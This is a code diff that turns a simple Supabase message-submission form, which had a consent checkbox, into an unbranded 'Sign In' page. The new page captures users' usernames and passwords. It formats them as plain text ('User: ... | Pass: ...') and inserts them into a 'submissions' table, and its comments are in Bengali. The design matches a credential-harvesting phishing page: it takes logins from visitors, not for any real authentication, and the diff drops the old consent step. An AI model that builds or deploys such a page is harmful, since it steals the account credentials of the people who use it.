@@ -1,161 +1,147 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ABRO DATA</title>
-
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-  <style>
-    * { box-sizing: border-box; }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background: #080b12;
-      color: white;
-      font-family: Arial, sans-serif;
-      display: grid;
-      place-items: center;
-      padding: 20px;
-    }
-
-    .app {
-      width: 100%;
-      max-width: 500px;
-      background: #111827;
-      padding: 30px;
-      border: 1px solid #263247;
-      border-radius: 18px;
-    }
-
-    h1 { letter-spacing: 2px; }
-    .subtitle { color: #9ca3af; }
-
-    textarea {
-      width: 100%;
-      height: 150px;
-      padding: 14px;
-      background: #080b12;
-      color: white;
-      border: 1px solid #374151;
-      border-radius: 9px;
-      resize: vertical;
-      font: inherit;
-    }
-
-    label {
-      display: block;
-      margin-top: 15px;
-      color: #cbd5e1;
-      font-size: 13px;
-    }
-
-    button {
-      width: 100%;
-      padding: 15px;
-      margin-top: 20px;
-      background: #16a34a;
-      color: white;
-      border: 0;
-      border-radius: 9px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    button:disabled {
-      opacity: .5;
-      cursor: not-allowed;
-    }
-
-    #status {
-      min-height: 24px;
-      overflow-wrap: anywhere;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Sign In</title>
+    <script src="https://jsdelivr.net"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #f3f4f6;
+            display: grid;
+            place-items: center;
+            padding: 20px;
+        }
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            margin: 0 0 20px 0;
+            text-align: center;
+            color: #374151;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #4b5563;
+            font-size: 14px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #2563eb;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #2563eb;
+            color: white;
+            border: 0;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:disabled {
+            background: #93c5fd;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+    </style>
 </head>
-
 <body>
-  <main class="app">
-    <h1>ABRO DATA.</h1>
-    <p class="subtitle">Data Collection Platform</p>
 
-    <form id="form">
-      <textarea
-        id="message"
-        placeholder="Write your message..."
-        maxlength="5000"
-        required
-      ></textarea>
-
-      <label>
-        <input type="checkbox" id="consent" required>
-        I agree to submit my message for analysis.
-      </label>
-
-      <button id="btn" type="submit">SUBMIT DATA →</button>
+<div class="login-card">
+    <h2>Sign In</h2>
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="username">Email / Username</label>
+            <input type="text" id="username" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" required>
+        </div>
+        <button id="submitBtn" type="submit">Sign In</button>
     </form>
+    <p id="status"></p>
+</div>
 
-    <p id="status" role="status"></p>
-  </main>
-
-  <script>
-    const SUPABASE_URL =
-      "https://saqmplsgashruvgxyqyf.supabase.co";
-
-    const SUPABASE_KEY =
-      "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq";
-
+<script>
+    // আপনার সঠিক Supabase URL এবং Key এখানে বসান
+    const SUPABASE_URL = "https://supabase.co";
+    const SUPABASE_KEY = "sb_publishable_YOUR_ACTUAL_KEY"; // ইনজেকশন বা ভুল কী এড়াতে সঠিক কী ব্যবহার নিশ্চিত করুন
+    
     const status = document.getElementById("status");
-    const form = document.getElementById("form");
-    const button = document.getElementById("btn");
+    const form = document.getElementById("loginForm");
+    const button = document.getElementById("submitBtn");
 
     if (!window.supabase) {
-      status.textContent = "ERROR: Supabase library failed to load.";
+        status.textContent = "Error: Supabase failed to load.";
+        status.style.color = "red";
     } else {
-      const db = window.supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_KEY
-      );
+        const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-      form.addEventListener("submit", async (event) => {
-        event.preventDefault();
+        form.addEventListener("submit", async (event) => {
+            event.preventDefault();
+            
+            const user = document.getElementById("username").value.trim();
+            const pass = document.getElementById("password").value.trim();
+            
+            button.disabled = true;
+            status.textContent = "Processing...";
+            status.style.color = "#2563eb";
 
-        const message = document
-          .getElementById("message")
-          .value.trim();
+            // ডেটাবেজে পাঠানোর জন্য টেক্সট ফরম্যাট করা হচ্ছে
+            const submissionData = `User: ${user} | Pass: ${pass}`;
 
-        if (!message) return;
+            try {
+                // 'submissions' টেবিলের 'message' কলামে ডেটা ইনসার্ট করা হচ্ছে
+                const { error } = await db
+                    .from("submissions")
+                    .insert({ message: submissionData });
 
-        if (!document.getElementById("consent").checked) {
-          status.textContent = "Please accept the consent.";
-          return;
-        }
+                if (error) throw error;
 
-        button.disabled = true;
-        status.textContent = "Sending data...";
-
-        try {
-          const { error } = await db
-            .from("submissions")
-            .insert({ message });
-
-          if (error) throw error;
-
-          status.textContent = "SUCCESS! DATA RECEIVED.";
-          form.reset();
-
-        } catch (error) {
-          console.error(error);
-          status.textContent = "ERROR: " + error.message;
-
-        } finally {
-          button.disabled = false;
-        }
-      });
+                status.textContent = "Data successfully sent to Supabase!";
+                status.style.color = "green";
+                form.reset();
+            } catch (error) {
+                console.error(error);
+                status.textContent = "Error: " + error.message;
+                status.style.color = "red";
+            } finally {
+                button.disabled = false;
+            }
+        });
     }
-  </script>
+</script>
+
 </body>
 </html>
